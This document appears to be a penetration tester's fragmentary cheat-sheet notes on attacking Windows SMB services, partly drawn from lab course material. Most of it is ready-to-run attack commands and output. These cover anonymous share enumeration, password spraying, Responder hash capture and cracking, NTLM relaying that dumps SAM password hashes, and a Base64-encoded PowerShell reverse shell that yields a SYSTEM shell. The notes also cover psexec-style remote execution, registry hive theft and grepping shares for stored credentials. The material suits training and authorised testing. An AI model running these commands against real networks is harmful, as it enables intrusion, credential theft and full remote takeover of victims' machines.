UDP ports `137` and `138`
139 for netbios 135/ rpc
445 for smb directly without netbios
## Attacks

1. sensitive files in shares
2. Responder capture and crack ntlmv2 hashes
3. ntlm relayX to authenticate to themselves and dump SAM
check null session
```shell-session
smbclient -N -L //10.129.14.128
```
spider all shares
```
 nxc smb 10.129.168.30 -u anonymous -p ''  -M spider_plus

```
### Password Spray

Spraying domain joined 
```shell-session
$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' d <domain>  --continue-on-success
```
non domain joined with local-auth
```
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth  --continue-on-success
```


get users
```
--users
```

`logged in`
```shell-session
$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

`enumerate users with rdp sessions`
```
 nxc --qwinsta             Enumerate RDP connections
```

### Host
enumerate local groups on a target host
```
--local-groups
```

### manual share enumeration:

1. using smbclient-ng
use tree to recursively list a share
```
nxc smb ip -u x -p '' --shares # get share names from here.


smbclient-ng \\ip\sharename -u x  -p x 
# example:
smbclient-ng \\ip\SYSVOL -u mag  -p pass123 
■[\\172.16.8.3\SYSVOL\\]> tree  
└── ad.someorg.local/  
  
   │   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}/  
   │       ├── MACHINE/  
   │       │   └── Microsoft/  
   │       │       └── Windows NT/  
   │       │           └── SecEdit/  
   │       │               └── GptTmpl.inf  
   │       ├── USER/  
   │       └── GPT.INI  
   └── scripts/  
       └── adum.vbs  
```
## credential mining

#### SPIDER a Share
```shell
sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'

cat /tmp/cme_spider_plus/ | jq .
```

#### THESE DONT WORK/REQUIRE TUNING
```
nxc --spider <share> --pattern 'pass' # never got this to work properly
```

```
nxc --spider <share> --pattern '<pattern>' --regex '<regex>'
```
 
 Options for spidering shares  
  ```

 --spider SHARE        share to spider  
 --spider-folder FOLDER  
                       folder to spider (default: .)  
 --content             enable file content searching  
 --exclude-dirs DIR_LIST  
                       directories to exclude from spidering  
 --depth DEPTH         max spider recursion depth  
 --only-files          only spider files  
 --pattern PATTERN [PATTERN ...]  
                       pattern(s) to search for in folders, filenames and file content  
 --regex REGEX [REGEX ...]  
                       regex(s) to search for in folders, filenames and file content
```

## Files
NXC get file
```
 --get-file FILE <path>  Get a remote file, ex: \\Windows\\Temp\\whoami.txt whoami.txt
```

### spider all share files
The module `spider_plus` will dig through each readable share on the host and list all readable files. Let's give it a try.

```shell
sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
/tmp/cme_spider_plus
```
read output json file

## SMBMAP
```shell-session
$ smbmap -u forend -p Klmcargo2 -d ad.someorg.local -H 172.16.5.5
```
### Recursive list of all directories (no files)
```shell-session
$ smbmap -u forend -p Klmcargo2 -d ad.someorg.local -H 172.16.5.5 -R 'Department Shares'
```


---
## Remote Commands
```shell-session
 impacket-psexec -h
```

To connect to a remote machine with a local administrator account, using `impacket-psexec`, you can use the following command:

```shell-session
$ impacket-psexec administrator:'Password123!'@10.10.110.17
```

using netexc RCE
```shell-session
$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

extract SAM hashes
```shell-session
]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

## Forcing Authentication attacks (poisoning)
by creating a fake SMB Server to capture users' [NetNTLM
```shell-session
$ sudo responder -I ens33
```
crack hash
```shell-session
]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

If we cannot crack the hash, we can potentially relay the captured hash to another machine using [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) or Responder [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py). Let us see an example using `impacket-ntlmrelayx`.

# NTLM RELAYING  

If we cannot crack the hash, we can potentially relay the captured hash to another machine using [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) or Responder [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py). Let us see an example using `impacket-ntlmrelayx`.

First, we need to set SMB to `OFF` in our responder configuration file (`/etc/responder/Responder.conf`).

Attacking SMB

```shell-session
magdy3660@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```

Then we execute `impacket-ntlmrelayx` with the option `--no-http-server`, `-smb2support`, and the target machine with the option `-t`. By default, `impacket-ntlmrelayx` will dump the SAM database, but we can execute commands by adding the option `-c`.

Attacking SMB

```shell-session
magdy3660@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<SNIP>

[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections

[*] SMBD-Thread-3: Connection from /ADMINISTRATOR@10.10.110.1 controlled, attacking target smb://10.10.110.146
[*] Authenticating against smb://10.10.110.146 as /ADMINISTRATOR SUCCEED
[*] SMBD-Thread-3: Connection from /ADMINISTRATOR@10.10.110.1 controlled, but there are no more targets left!
[*] SMBD-Thread-5: Connection from /ADMINISTRATOR@10.10.110.1 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xeb0432b45874953711ad55884094e9d4
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92512f2605074cfc341a7f16e5fabf08:::
demouser:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
test:1001:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
[*] Done dumping SAM hashes for host: 10.10.110.146
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```

We can create a PowerShell reverse shell using [https://www.revshells.com/](https://www.revshells.com/), set our machine IP address, port, and the option Powershell #3 (Base64).

Attacking SMB

```shell-session
magdy3660@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```

Once the victim authenticates to our server, we poison the response and make it execute our command to obtain a reverse shell.

Attacking SMB

```shell-session
magdy3660@htb[/htb]$ nc -lvnp 9001

listening on [any] 9001 ...
connect to [10.10.110.133] from (UNKNOWN) [10.10.110.146] 52471

PS C:\Windows\system32> whoami;hostname

nt authority\system
WIN11BOX
```

# SysInternals psexec
We can download PsExec from [Microsoft website](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec), or we can use some Linux implementations:

- [Impacket PsExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) - Python PsExec like functionality example using [RemComSvc](https://github.com/kavika13/RemCom).
- [Impacket SMBExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) - A similar approach to PsExec without using [RemComSvc](https://github.com/kavika13/RemCom). The technique is described [here](https://web.archive.org/web/20190515131124/https://www.optiv.com/blog/owning-computers-without-shell-access). This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.
- [Impacket atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py) - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - includes an implementation of `smbexec` and `atexec`.
	- [Metasploit PsExec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md) - Ruby PsExec implementation.

nxc retrieve files remotely
Bash

```

nxc smb <DC_IP> -u <ADMIN_USERNAME> -H <ADMIN_HASH> -x "reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hiv"`
```


**Step 2: Download the Saved SYSTEM Hive**

Once the SYSTEM.hiv file has been created on the target DC, you can use nxc's file transfer capability to download it to your local machine.

```
nxc smb <DC_IP> -u <ADMIN_USERNAME> -H <ADMIN_HASH> --get 'C:\Windows\Temp\SYSTEM.hiv'
```

### download using smbmap
```shell-session
smbmap -H 10.129.14.128 --download "notes\note.txt"
```
### upload
```shell-session
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```
### mount smb
smb mounting
![[Pasted image 20251005144924.png]]



# enumeration cmds

Anon access
```shell-session
$ smbclient -N -L //10.129.14.128
```

read smb with smbmap
```shell
smbmap -H 10.129.14.128

[+] IP: 10.129.14.128:445     Name: 10.129.14.128                                   
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       IPC Service (DEVSM)
        notes                                                   READ, WRITE     CheckIT
```

Using `smbmap` with the `-r` or `-R` (recursive) option, one can browse the directories:

```shell-session
smbmap -H 10.129.14.128 -r notes

       dr--r--r               0 Mon Nov  2 00:57:44 2020    ..
        dr--r--r               0 Mon Nov  2 00:57:44 2020    LDOUJZWBSG
        fw--w--w             116 Tue Apr 16 07:43:19 2019    note.txt
```
download files
```shell-session
$ smbmap -H 10.129.14.128 --download "notes\note.txt"
```

# from Windows
There are different ways we can interact with a shared folder using Windows, and we will explore a couple of them. On Windows GUI, we can press `[WINKEY] + [R]` to open the Run dialog box and type the file share location, e.g.: `\\192.168.220.129\Finance\`

![Windows Server 2012 R2 desktop with Run dialog open, showing network path entry.](https://academy.hackthebox.com/storage/modules/116/windows_run_sharefolder2.jpg)

Suppose the shared folder allows anonymous authentication, or we are authenticated with a user who has privilege over that shared folder. In that case, we will not receive any form of authentication request, and it will display the content of the shared folder.

![File explorer open to network path \192.168.220.133\Finance showing Contracts folder.](https://academy.hackthebox.com/storage/modules/116/finance_share_folder2.jpg)

If we do not have access, we will receive an authentication request.
with `dir` 
```
dir \\IP\SHARE
```
## Mounting shares
with `net` mount share to  drive `n`
```
net use n: \\192.168.220.129\Finance
```
with authentication
```
net use n: \\192.168.220.129\Finance /user:plaintext Password123
```

another way of mounting
```powershell-session
New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem"
```
with creds
```powershell-session
 $username = 'plaintext'
PS C:\htb> $password = 'Password123'
PS C:\htb> $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\htb> $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred
```
## Mounting shares on linux
```shell-session
$ sudo mkdir /mnt/Finance
$ sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
```
As an alternative, we can use a credential file.

```shell-session
mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile
```

The file `credentialfile` has to be structured like this:

```txt
username=plaintext
password=Password123
domain=.
```
We need to install `cifs-utils` to connect to an SMB share folder. To install it we can execute from the command line `sudo apt install cifs-utils`.
once mounted we can start search

hunt for a filename that contains the string `cred`:
```shell-session
$ find /mnt/Finance/ -name *cred*
```
Next, let's find files that contain the string `cred`:
```shell-session
grep -rn /mnt/Finance/ -ie cred

	/mnt/Finance/Contracts/private/credentials.txt:1:admin:SecureCredentials!
```
---------------
## listing shares content
list number of files
```powershell-session
 N:
PS N:\> (Get-ChildItem -File -Recurse | Measure-Object).Count
```

```powershell-session
Get-ChildItem \\192.168.220.129\Finance\
```
-------- 
## hunting for passwords
```
findstr /s /i /n /c:"pass" /c:"password" /c:"secret" N:\* > results.out
```

hunting for tokens
```
findstr /s /i /n /c:"token" /c:"admin"
```

multi search terms
```
findstr /s /i /n /g:stringlist.txt N:\* > results.out
```

with get-childitem
```powershell-session
Get-ChildItem -Recurse -Path C:\ -Include *cred* -File
```

with select-string
```powershell-session
Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List

N:\Contracts\private\secret.txt:1:file with all credentials
N:\Contracts\private\credentials.txt:1:admin:SecureCredentials!
```
